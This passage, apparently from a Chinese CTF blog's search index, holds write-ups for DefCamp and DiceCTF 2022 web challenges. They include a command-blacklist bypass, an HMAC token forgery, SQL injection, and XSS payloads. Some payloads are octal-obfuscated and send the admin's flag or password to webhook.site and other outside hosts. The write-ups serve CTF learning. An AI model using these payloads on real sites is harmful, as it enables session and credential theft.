\u0026#39;ss\u0026#39;,\u0026#39;sc\u0026#39;,\u0026#39;aa\u0026#39;,\u0026#39;od\u0026#39;,\u0026#39;pr\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;ps\u0026#39;,\u0026#39;pa\u0026#39;,\u0026#39;pd\u0026#39;,\u0026#39;pp\u0026#39;,\u0026#39;po\u0026#39;,\u0026#39;pc\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pt\u0026#39;,\u0026#39;pu\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;ls\u0026#39;,\u0026#39;dd\u0026#39;,\u0026#39;nl\u0026#39;,\u0026#39;nk\u0026#39;,\u0026#39;df\u0026#39;,\u0026#39;wc\u0026#39;, \u0026#39;du\u0026#39; ); $valid = true; foreach($blackList as $blackItem) { if(strpos($_GET[\u0026#39;start\u0026#39;], $blackItem) !== false) { $valid = false; break; } } if(!$valid) { show_source(__FILE__); exit; } // This will return output only for id and ps. if (strlen($_GET[\u0026#39;start\u0026#39;]) \u0026lt; 5){ echo shell_exec($_GET[\u0026#39;start\u0026#39;]); } else { echo \u0026#34;Please enter a valid command\u0026#34;; } if (False) { echo $flag; } ?\u0026gt; 一看这个代码以为致敬[HitconCTF 2017]babyfirst-revenge，不过多了blacklist\n然后试了半天发现好像不太行，黑名单太多了导致用那种方式完全做不了，也没有考虑其它角度 就放弃了\n看了wp之后才发现我是小丑，tmd\n/?start=l\\s\t# flag.php index.php /?start=m4 * 用到的m4命令，之前完全没用过……所以也没想到\n最近做题和学习中明显地发现了自己的不足之处，就是动手太少了，觉得脑子能记住能理解，但实际情况往往就不是这么一回事，你不动手做就是不会，就是不知道中间的坑点在哪里，这样畏手畏脚地是绝对走不远的，也会让自己很难受\n时刻提醒自己，要脚踏实地的学，认真一些\n","date":"2022-02-17T01:09:02+08:00","permalink":"https://amiaaaz.github.io/2022/02/17/defcampctf2022-wp/","section":"posts","tags":["wp"],"title":"defcampCTF2022 Wp"},{"categories":["CTF"],"contents":"https://ctf.dicega.ng/challs | https://ctftime.org/event/1541/tasks/\nhttps://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ | 官方wp\nhttps://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/ | 建议全部看完\nhttps://blog.maple3142.net/2022/02/07/dicectf-2022-writeups | 比较详细的wp\nTI-1337：属于是深入了解PVM，建议直接看别的师傅们的wp Vinegar：wp看不懂，涉及pwn和深入的pickle操作 denoblog：一转pwn，看懂 但是不会 carrot：很复杂的XS-Leaks，放弃 dicevault：说是致敬vault，把vault做了之后看这个还是不会做，寄 noteKeeper：很复杂的xss，寄 ————属于是复现流做题选手重现江湖，就会做1道，其余全复现（哭哭），上面这几道题由于个人水平有限，复现都复不了，非常非常非常失败，建议看别的wp\nmisc/welcome Please join the competition Discord and read the #rules channel.\ndice{sice}\nweb/knock-knock Knock knock? Who\u0026rsquo;s there? Another pastebin!!\nknock-knock.mc.ax\nindex.js | Dockerfile\nconst crypto = require(\u0026#39;crypto\u0026#39;); class Database { constructor() { this.notes = []; this.secret = `secret-${crypto.randomUUID}`; } createNote({ data }) { const id = this.notes.length; this.notes.push(data); return { id, token: this.generateToken(id), }; } getNote({ id, token }) { if (token !== this.generateToken(id)) return { error: \u0026#39;invalid token\u0026#39; }; if (id \u0026gt;= this.notes.length) return { error: \u0026#39;note not found\u0026#39; }; return { data: this.notes[id] }; } generateToken(id) { return crypto .createHmac(\u0026#39;sha256\u0026#39;, this.secret) .update(id.toString()) .digest(\u0026#39;hex\u0026#39;); } } const db = new Database(); db.createNote({ data: process.env.FLAG }); const express = require(\u0026#39;express\u0026#39;); const app = express(); app.use(express.urlencoded({ extended: false })); app.use(express.static(\u0026#39;public\u0026#39;)); app.post(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; { const data = req.body.data ?? \u0026#39;no data provided.\u0026#39;; const { id, token } = db.createNote({ data: data.toString() }); res.redirect(`/note?id=${id}\u0026amp;token=${token}`); }); app.get(\u0026#39;/note\u0026#39;, (req, res) =\u0026gt; { const { id, token } = req.query; const note = db.getNote({ id: parseInt(id ?? \u0026#39;-1\u0026#39;), token: (token ?? \u0026#39;\u0026#39;).toString(), }); if (note.error) { res.send(note.error); } else { res.send(note.data); } }); app.listen(3000, () =\u0026gt; { console.log(\u0026#39;listening on port 3000\u0026#39;); }); 典型的pastebin，提前将环境变量中的flag写到其中，对于note有id和token两项索引的标识（id是note的长度，note是生成的uuid）\n看起来很安全，但是uuid用的key其实根本没调用crypto.randomUUID这个函数\n而是一个完全的定值，flag的id=1，我们可以直接生成对应的token\ncrypto.createHmac(\u0026#39;sha256\u0026#39;,secret).update(\u0026#39;0\u0026#39;).digest(\u0026#39;hex\u0026#39;) 值得注意的是这个定值和js的版本有关系，win和linux下的运行结果也有差异（换行符的问题\n最后的token值\n\u0026#39;7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264\u0026#39; paylaod\n/note?id=0\u0026amp;token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264 web/blazingfast I made a blazing fast MoCkInG CaSe converter!\nblazingfast.mc.ax | Admin Bot\nblazingfast.tar | admin-bot.js | blazingfast.c\n这个题特殊在结合了webassembly，是个不常见的点（虽然在这题里作用并不大），整体思路还是比较清晰的\n肯定是要xss的，接下来要思考如何绕过mock中的过滤，我在做的时候没有做出来，下面是复现\n————先说一下很多人采用的非预期想法：结合了wasm（c语言编译）的数据写入，在末尾没有写入null-byte字符，而js只有在遇到null-byte才会停止数据读入，利用这一点我们可以完成数据走私smuggle，发送我们的payload；首先发送带有垃圾数据的xss payload，此时因为waf的检测而报错，之后再发送一个payload，覆盖前面的垃圾数据部分而留下xss的部分，并且并不会对xss的部分进行大小写的转换\n这要求我们发送两次payload，而同时给admin的只有一个url，肯定不行\n————预期解和这个差别其实并不很大，采用离谱的unicode欺骗payload的实际长度\n首先检测输入内容的长度 大于1000退出，之后全部转为大写后再读入buf数组中，之后进行blazingfast.mock()处理时依据的length则是最开始init时的长度，只有膨胀前的部分会被mock处理，而随后剩下的部分将被走私读入mocking中，作为mock的返回值留到页面上 document.getElementById('result').innerHTML = mock(str);\n关于获取flag的部分，我们需要获取admin的localStorage中的flag，需要fetch到我们的hookbin中，由于window是小写不能直接操作他，可以构造函数或是用原型的方式；payload可以用8进制或html实体\npayload\nﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄ\u0026lt;img src=x onerror=\u0026#34;\u0026#39;\u0026#39;[\u0026#39;\\141\\164\u0026#39;][\u0026#39;\\137\\137\\160\\162\\157\\164\\157\\137\\137\u0026#39;][\u0026#39;\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\u0026#39;](\u0026#39;\\146\\145\\164\\143\\150(`\\150\\164\\164\\160\\163://\\167\\145\\142\\150\\157\\157\\153.\\163\\151\\164\\145/90396\\1465\\141-59\\146\\141-40\\146\\145-\\14182\\146-\\145\\14421\\1415\\14611009?Q=${\\154\\157\\143\\141\\154S\\164\\157\\162\\141\\147\\145.\\146\\154\\141\\147}`)\u0026#39;)()\u0026#34;/\u0026gt; \u0026lt;img src=x onerror=\u0026#34;\u0026#39;\u0026#39;[\u0026#39;at\u0026#39;][\u0026#39;__proto__\u0026#39;][\u0026#39;constructor\u0026#39;](\u0026#39;fetch(`https://webhook.site/90396f5a-59fa-40fe-a82f-ed21a5f11009?Q=${localStorage.flag}`)\u0026#39;)()\u0026#34;/\u0026gt; web/no-cookies I found a more secure way to authenticate users. No cookies, no problems!\ninstancer.mc.ax/no-cookies | Admin Bot\ndist.tar | index.js | admin-bot.js\n还是先看admin bot\nimport flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise((resolve) =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;no-cookies\u0026#39;, name: \u0026#39;no-cookies\u0026#39;, urlRegex: /^https:\\/\\/no-cookies-[a-f0-9]{16}\\.mc\\.ax\\/view\\?id=[a-f0-9]{32}$/, timeout: 10000, extraFields: [ { name: \u0026#39;instance\u0026#39;, displayName: \u0026#39;Instance ID\u0026#39;, placeholder: \u0026#39;no-cookies-{THIS}.mc.ax\u0026#39;, regex: \u0026#39;^[0-9a-f]{16}$\u0026#39;, }, ], handler: async (url, ctx, { instance }) =\u0026gt; { const page = await ctx.newPage(); const doLogin = async (username, password) =\u0026gt; { return new Promise((resolve) =\u0026gt; { page.once(\u0026#39;dialog\u0026#39;, (first) =\u0026gt; { page.once(\u0026#39;dialog\u0026#39;, (second) =\u0026gt; { second.accept(password); }); first.accept(username); resolve(); }); }); }; // make an account const username = Array(32) .fill(\u0026#39;\u0026#39;) .map(() =\u0026gt; Math.floor(Math.random() * 16).toString(16)) .join(\u0026#39;\u0026#39;); // 用户名任意 const password = flag; // 我们要得到的flag 在密码中 const firstLogin = doLogin(username, password); try { page.goto(`https://no-cookies-${instance}.mc.ax/register`); // 注册 } catch {} await firstLogin; // 登入 await sleep(3000); // visit the note and log in const secondLogin = doLogin(username, password); // 再登入 try { page.goto(url); // 访问我们的url } catch {} await secondLogin; await sleep(3000); }, }; 看我们的index.js，页面不管什么操作，/register, /login, /create, /view都会先要求输入账号密码，我们可以创建md的内容并渲染出来，在/view处有这样的js\n(() =\u0026gt; { const validate = (text) =\u0026gt; { return /^[^$\u0026#39;]+$/.test(text ?? \u0026#39;\u0026#39;);\t// 过滤 没过滤双引号 } const promptValid = (text) =\u0026gt; { let result = prompt(text) ?? \u0026#39;\u0026#39;; return validate(result) ? result : promptValid(text); } const username = promptValid(\u0026#39;Username:\u0026#39;); const password = promptValid(\u0026#39;Password:\u0026#39;);\t// 上一次正则 const params = new URLSearchParams(window.location.search); (async () =\u0026gt; { const { note, mode, views } = await (await fetch(\u0026#39;/view\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, }, body: JSON.stringify({ username, password, id: params.get(\u0026#39;id\u0026#39;) }) })).json(); if (!note) { alert(\u0026#39;Invalid username, password, or note id\u0026#39;); window.location = \u0026#39;/\u0026#39;; return; } let text = note; if (mode === \u0026#39;markdown\u0026#39;) { text = text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, (match, p1, p2) =\u0026gt; {\t// 正则 return `\u0026lt;a href=\u0026#34;${p2}\u0026#34;\u0026gt;${p1}\u0026lt;/a\u0026gt;`;\t// xss处 }); text = text.replace(/#\\s*([^\\n]+)/g, (match, p1) =\u0026gt; { return `\u0026lt;h1\u0026gt;${p1}\u0026lt;/h1\u0026gt;`; }); text = text.replace(/\\*\\*([^\\n]+)\\*\\*/g, (match, p1) =\u0026gt; { return `\u0026lt;strong\u0026gt;${p1}\u0026lt;/strong\u0026gt;`; }); text = text.replace(/\\*([^\\n]+)\\*/g, (match, p1) =\u0026gt; { return `\u0026lt;em\u0026gt;${p1}\u0026lt;/em\u0026gt;`; }); } document.querySelector(\u0026#39;.note\u0026#39;).innerHTML = text;\t// 插入页面中 document.querySelector(\u0026#39;.views\u0026#39;).innerText = views; })(); })(); 比较容易注意到这个xss点，它可以渲染超链接，但是没过滤双引号，导致我们可以这样\n// md (link text)[http://example.com\u0026#34; class=\u0026#34;foo] // innerHTML \u0026lt;a href=\u0026#34;http://example.com\u0026#34; class=\u0026#34;foo\u0026#34;\u0026gt;link text\u0026lt;/a\u0026gt; 可以构造出这样的payload\n// md (link text)[http://example.com\u0026#34; onmouseover=\u0026#34;alert`1`] // innerHTML \u0026lt;a href=\u0026#34;http://example.com\u0026#34; onmouseover=\u0026#34;alert`1`\u0026gt;link text\u0026lt;/a\u0026gt; 不过admin无鼠标操作，这里要结合js正则匹配的特性，RegExp.input可以拿到上一次传入正则匹配函数中的输入值\n/a/.test(\u0026#39;secret password\u0026#39;) console.log(RegExp.input) // secret password 不过仅有这一个xss点还不行，含有这样payload的note必须插入后得到一个admin能访问的url，这里就需要后端的sqlite注入了\nconst db = { prepare: (query, params) =\u0026gt; { if (params) for (const [key, value] of Object.entries(params)) { const clean = value.replace(/[\u0026#39;$]/g, \u0026#39;\u0026#39;); query = query.replaceAll(`:${key}`, `\u0026#39;${clean}\u0026#39;`); } return query; }, [...] run: (query, params) =\u0026gt; { const prepared = db.prepare(query, params); console.log( prepared ); return database.prepare(prepared).run(); }, }; [...] db.run(\u0026#39;INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)\u0026#39;, { id, username, note: note.replace(/[\u0026lt;\u0026gt;]/g, \u0026#39;\u0026#39;), mode, }); 注意看db的操作\nfor (const [key, value] of Object.entries(params)) { const clean = value.replace(/[\u0026#39;$]/g, \u0026#39;\u0026#39;); query = query.replaceAll(`:${key}`, `\u0026#39;${clean}\u0026#39;`); } 对传入的每一对参数，按顺序，先把所有的单引号和$去掉，再替换:param为'clean'\n在后面/create中会依次传入四个参数\ndb.run(\u0026#39;INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)\u0026#39;, { id, username, note: note.replace(/[\u0026lt;\u0026gt;]/g, \u0026#39;\u0026#39;), mode, }); payload是这样\n\u0026#34;username\u0026#34;: \u0026#34;a :note\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34; \u0026#34;note\u0026#34;: \u0026#34;, :mode, 0, 0) -- \u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;actual note and xss\u0026#34; -- 原 INSERT INTO notes VALUES (:id, :username, :note, :mode, 0) -- id 123 INSERT INTO notes VALUES (\u0026#39;123\u0026#39;, :username, :note, :mode, 0) -- username INSERT INTO notes VALUES (\u0026#39;123\u0026#39;, \u0026#39;a :note\u0026#39;, :note, :mode, 0) -- note 两个`:note`都会被换掉 INSERT INTO notes VALUES (\u0026#39;123\u0026#39;, \u0026#39;a \u0026#39;, :mode, 0, 0) -- \u0026#39;\u0026#39;, \u0026#39;, :mode, 0, 0) -- \u0026#39;, :mode, 0) -- mode 此时note值我们完全可控 INSERT INTO notes VALUES (\u0026#39;123\u0026#39;, \u0026#39;a \u0026#39;, \u0026#39;actual note and xss\u0026#39;, 0, 0) -- \u0026#39;\u0026#39;, \u0026#39;, :mode, 0, 0) -- \u0026#39;, \u0026#39;actual note and xss\u0026#39;, 0) 所以结合上面，我们最终的payload是这样的\n$ curl \u0026#39;https://no-cookies-0ac0b52c95f3abe3.mc.ax/create\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; --data-raw \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;:note\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;,:mode, 22, 0)-- \u0026#34;,\u0026#34;mode\u0026#34;:\u0026#34;\u0026lt;img src=x onerror=\\\u0026#34;window.location=\u0026amp;quot;https://bawolff.net?\u0026amp;quot;+RegExp.input\\\u0026#34;\u0026gt;\u0026#34;}\u0026#39; 非预期 当然逃不了js大手子们的非预期解了，非预期没有用到RegExp.input，而是\ndocument.querySelector(\u0026#39;.note\u0026#39;).innerHTML = text; document.querySelector(\u0026#39;.views\u0026#39;).innerText = views; 有两种情况\n\u0026lt;div id=x\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=y\u0026gt;hello\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; x.innerHTML = \u0026#39;\u0026lt;img src=x onerror=alert(window.y.innerText)\u0026gt;\u0026#39; y.innerText = \u0026#39;updated\u0026#39; \u0026lt;/script\u0026gt; 此时alert的内容是updated，而如果换成\u0026lt;svg\u0026gt;就不一样了\n\u0026lt;div id=x\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=y\u0026gt;hello\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; x.innerHTML = \u0026#39;\u0026lt;svg\u0026gt;\u0026lt;svg onload=alert(window.y.innerText)\u0026gt;\u0026#39; y.innerText = \u0026#39;updated\u0026#39; \u0026lt;/script\u0026gt; 它alert的是前面的hello\n而渲染页面的js代码简化后是这样\n(async () =\u0026gt; { const { note, mode, views } = await (await fetch(\u0026#39;/view\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, }, body: JSON.stringify({ username, password, id: params.get(\u0026#39;id\u0026#39;) }) })).json(); document.querySelector(\u0026#39;.note\u0026#39;).innerHTML = text; // 在底下這行執行之前，會先執行我們的 XSS payload document.querySelector(\u0026#39;.views\u0026#39;).innerText = views; })(); 利用上面\u0026lt;svg\u0026gt;插入后先执行的特点，如果我们可以在最后一行执行之前，doSomeMagic，将document.querySelector覆盖，再把JSON.stringify覆盖，像这样\ndocument.querySelector = function(){ JSON.stringify = function(date){ } } 之后就可以用传统艺能arguments.callee.caller了，可以取到调用JSON.stringify的async并调用一次，就可以执行我们的内容了\ndocument.querySelector = function(){ JSON.stringify = function(data){ console.log(data.password)\t// true payload here!!! } arguments.callee.caller() } 全payload\n\u0026lt;svg\u0026gt;\u0026lt;svg/onload=\u0026#34;document.querySelector=function(){JSON.stringify=a=\u0026gt;fetch(`https://webhook.site/11b32903-2d6a-4efc-b687-e06a0f0226aa?`+a.password),arguments.callee.caller()}\u0026#34;\u0026gt; web/vm-calc A simple and very secure online calculator!\ninstancer.mc.ax/vm-calc\ndist.tar\n先看package.json涉及到包的版本信息，最新版本的vm2(3.9.5)，无公开的逃逸漏洞 所以肯定不是沙盒逃逸，hbs版本存在一个文件泄露的洞CVE-2021-32822\n然后看index.js，.我们需要登入admin账号拿flag，虽然给出了我们username和password，但是是sha256后的结果，没法摁得到明文\n————看到wp后发现自己还是查的少了，不是vm2没0day，而是这里用的是Nodejs的1day，CVE-2022-21824，出问题的地方是map\nconsole.table([{x:1}], [\u0026#34;__proto__\u0026#34;]); 就可以做到原型污染\n题目中的filter检测是这样的\nif(users.filter(u =\u0026gt; u.user === user \u0026amp;\u0026amp; u.pass === hash)[0] !== undefined) { res.render(\u0026#34;admin\u0026#34;, { flag: await fsp.readFile(\u0026#34;flag.txt\u0026#34;) }); } 所以只要污染原型链，让[][0]不为空，就可以通过admin的检测\nweb/shadow I found a totally secure way to insert secrets into a webpage\nshadow.mc.ax | Admin Bot\n页面源码可以看到js\n\u0026lt;script\u0026gt; // the admin has the flag set in localStorage[\u0026#34;secret\u0026#34;] let secret = localStorage.getItem(\u0026#34;secret\u0026#34;) ?? \u0026#34;dice{not_real_flag}\u0026#34; let shadow = window.vault.attachShadow({ mode: \u0026#34;closed\u0026#34; }); let div = document.createElement(\u0026#34;div\u0026#34;); div.innerHTML = ` \u0026lt;p\u0026gt;steal me :)\u0026lt;/p\u0026gt; \u0026lt;!-- secret: ${secret} --\u0026gt; `; let params = new URL(document.location).searchParams; let x = params.get(\u0026#34;x\u0026#34;); let y = params.get(\u0026#34;y\u0026#34;); div.style = y; shadow.appendChild(div); secret = null; localStorage.removeItem(\u0026#34;secret\u0026#34;); shadow = null; div = null; // free XSS window.xss.innerHTML = x; \u0026lt;/script\u0026gt; 使用cloesd模式的shadow DOM，我们无法直接处理它的DOM结构\n但是CSS样式可控，我们这里使用一个非标准的CSS属性：-webkit-user-modify，它与contenteditable类似，可以调用document.execCommand来插入HTML\n整体思路：先用 window.find去focus内容之后，再执行document.execCommand去插入 HTML，然后通过svg的event去执行JS拿到节点\n/?y=-webkit-user-modify:+read-write\u0026amp;x=\u0026lt;img+src=x+onerror=\u0026#34;find(\u0026#39;steal me\u0026#39;);document.execCommand(\u0026#39;insertHTML\u0026#39;,false,\u0026#39;\u0026lt;svg/onload=alert(this.parentNode.innerHTML)\u0026gt;\u0026#39;)\u0026#34;\u0026gt; 如果没有focus会失败；用img这样的会读不到this.parentNode，但是如果在前面加上document.exec('selectAll')也是可以的\n/?y=-webkit-user-modify:+read-write\u0026amp;x=\u0026lt;img+src=x+onerror=\u0026#34;find(\u0026#39;steal me\u0026#39;);document.execCommand(\u0026#39;selectAll\u0026#39;);document.execCommand(\u0026#39;insertHTML\u0026#39;,false,\u0026#39;\u0026lt;img/src=x+onerror=alert(this.parentNode.parentNode.innerHTML)\u0026gt;\u0026#39;)\u0026#34;\u0026gt; ***web/denoblog I love NodeJS and all, but I\u0026rsquo;ve heard that Deno is pretty cool\u0026hellip;\nI\u0026rsquo;m making my new blog on it! Even if there\u0026rsquo;s a vuln, Deno will protect me, right?\ninstancer.mc.ax/denoblog\ndist.tar\n页面上只有切换显示语言的功能，其它什么都没有，看一下app.ts\nimport { serve } from \u0026#34;https://deno.land/std/http/server.ts\u0026#34;; import * as cookie from \u0026#34;https://deno.land/std/http/cookie.ts\u0026#34;; import * as dejs from \u0026#34;https://deno.land/x/dejs/mod.ts\u0026#34;; const port = 8080; const handler = async (req: Request): Promise\u0026lt;Response\u0026gt; =\u0026gt; { let lang = cookie.getCookies(req.headers)[\u0026#34;lang\u0026#34;] ?? \u0026#34;en\u0026#34;; let body = await dejs.renderFileToString(\u0026#34;./views/index.ejs\u0026#34;, { lang }); let headers = new Headers(); headers.set(\u0026#34;content-type\u0026#34;, \u0026#34;text/html\u0026#34;); return new Response(body, { headers, status: 200 }); }; console.log(\u0026#34;[app] server now listening for connections...\u0026#34;); await serve(handler, { port }); 它使用cookie记录语言是en还是es，默认en，之后渲染./views/index.ejs为对应的语言\n\u0026lt;% await include(`./langs/${lang}`); %\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;denoblog\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://unpkg.com/@picocss/pico@latest/css/pico.classless.min.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;main\u0026gt; \u0026lt;hgroup\u0026gt; \u0026lt;h1\u0026gt;denoblog\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;\u0026lt;%= i18n.HEADER %\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;/hgroup\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;%= i18n.SWITCH_LANG %\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;javascript:document.cookie = \u0026#39;lang=en\u0026#39;; location.reload();\u0026#34;\u0026gt;English\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a 